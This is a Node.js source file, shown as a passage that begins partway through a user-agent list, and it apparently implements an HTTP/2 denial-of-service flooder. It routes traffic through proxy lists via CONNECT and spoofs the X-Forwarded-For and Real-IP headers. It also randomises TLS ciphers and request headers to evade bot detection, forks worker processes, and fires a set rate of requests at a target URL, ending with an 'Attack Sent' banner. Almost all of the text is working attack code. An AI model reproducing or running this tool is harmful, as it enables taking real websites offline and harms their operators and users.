  "mozilla/5.0 (macintosh; intel mac os x 13_2) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_2_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_4_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 13_6) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 14_0) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 14_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 14_2) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 14_3) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 14_4) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 14_5) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 14_6) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
  "mozilla/5.0 (macintosh; intel mac os x 14_6_1) applewebkit/605.1.15 (khtml, like gecko) version/17.0 safari/605.1.15",
];

var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
var accept =
  accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
var lang =
  lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
var encoding =
  encoding_header[
    Math.floor(Math.floor(Math.random() * encoding_header.length))
  ];
var control =
  control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;

function getRandomHeapSize() {
  const min = 1000;
  const max = 6222;
  return Math.floor(Math.random() * (max - min + 1)) + min;
}
if (cluster.isMaster) {
  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }

    console.log("[>] Restarting the script", RESTART_DELAY, "ms...");
    setTimeout(() => {
      for (let counter = 1; counter <= args.threads; counter++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
      }
    }, RESTART_DELAY);
  };

  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;

    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log("[!] Maximum RAM usage:", ramPercentage.toFixed(2), "%");
      restartScript();
    }
  };

  setInterval(handleRAMUsage, 5000);

  for (let counter = 1; counter <= args.threads; counter++) {
    const heapSize = getRandomHeapSize();
    cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
  }
} else {
  setInterval(runFlooder, 1);
}

class NetSocket {
  constructor() {}

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload =
      "CONNECT " +
      options.address +
      ":443 HTTP/1.1\r\nHost: " +
      options.address +
      ":443\r\nConnection: Keep-Alive\r\n\r\n";
    const buffer = new Buffer.from(payload);

    const connection = net.connect({
      host: options.host,
      port: options.port,
    });

    //connection.setTimeout(options.timeout * 600000);
    connection.setTimeout(options.timeout * 100000);
    connection.setKeepAlive(true, 100000);

    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", (chunk) => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

    connection.on("error", (error) => {
      connection.destroy();
      return callback(undefined, "error: " + error);
    });
  }
}

const Socker = new NetSocket();
headers[":method"] = "GET";
headers[":method"] = "POST";
headers[":method"] = randomMethod;
headers[":authority"] = parsedTarget.host;
headers[":path"] = parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
headers[":scheme"] = "https";
headers["x-forwarded-proto"] = "https";
headers["accept-language"] = lang;
headers["accept-encoding"] = encoding;
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["Real-IP"] = spoofed;
headers["cache-control"] = control;
headers["sec-ch-ua"] =
  '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"';
headers["sec-ch-ua-mobile"] = "?0";
headers["sec-ch-ua-platform"] = "Windows";
headers["origin"] = "https://" + parsedTarget.host;
headers["referer"] = "https://" + parsedTarget.host;
headers["upgrade-insecure-requests"] = "1";
headers["accept"] = accept;
headers["user-agent"] = randstr(15);
headers["sec-fetch-dest"] = "document";
headers["sec-fetch-mode"] = "navigate";
headers["sec-fetch-site"] = "none";
headers["TE"] = "trailers";
headers["Trailer"] = "Max-Forwards";
headers["sec-fetch-user"] = "?1";
headers["x-requested-with"] = "XMLHttpRequest";

function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  headers[":authority"] = parsedTarget.host;
  headers["referer"] = "https://" + parsedTarget.host + "/?" + randstr(15);
  headers["origin"] = "https://" + parsedTarget.host;

  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    timeout: 100,
  };

  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return;

    connection.setKeepAlive(true, 600000);

    const tlsOptions = {
      host: parsedTarget.host,
      port: 443,
      secure: true,
      ALPNProtocols: ["h2"],
      sigals: siga,
      socket: connection,
      ciphers: tls.getCiphers().join(":") + cipper,
      ecdhCurve: "prime256v1:X25519",
      host: parsedTarget.host,
      rejectUnauthorized: false,
      servername: parsedTarget.host,
      secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method"],
    };

    const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);

    tlsConn.setKeepAlive(true, 60000);

    const client = http2.connect(parsedTarget.href, {
      protocol: "https:",
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 2000,
        initialWindowSize: 65535,
        maxHeaderListSize: 65536,
        enablePush: false,
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConn,
      socket: connection,
    });

    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 2000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 65536,
      enablePush: false,
    });

    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          headers[":path"] =
            parsedTarget.path + "?" + randstr(5) + "=" + randstr(25);
          const request = client
            .request(headers)

            .on("response", (response) => {
              request.close();
              request.destroy();
              return;
            });

          request.end();
        }
      }, 1000);
    });

    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return;
    });
  }),
    function (error, response, body) {};
}

const StopScript = () => process.exit(1);
console.clear();
console.log(
  `
               _____    __     __                    __          _________                 __   ._. 
  /  _  \\ _/  |_ _/  |_ _____     ____  |  | __     /   _____/  ____    ____ _/  |_ | | 
 /  /_\\  \\\\   __\\\\   __\\\\__  \\  _/ ___\\ |  |/ /     \\_____  \\ _/ __ \\  /    \\\\   __\\| | 
/    |    \\|  |   |  |   / __ \\_\\  \\___ |    <      /        \\\\  ___/ |   |  \\|  |   \\| 
\\____|__  /|__|   |__|  (____  / \\___  >|__|_ \\    /_______  / \\___  >|___|  /|__|   __ 
        \\/                   \\/      \\/      \\/            \\/      \\/      \\/        \\/ 
`,
);
console.log("---------------------------------------------".red);
console.log(`[^^TARGET]  : `.red + process.argv[2]);
console.log("---------------------------------------------".red);
setTimeout(StopScript, args.time * 1000);
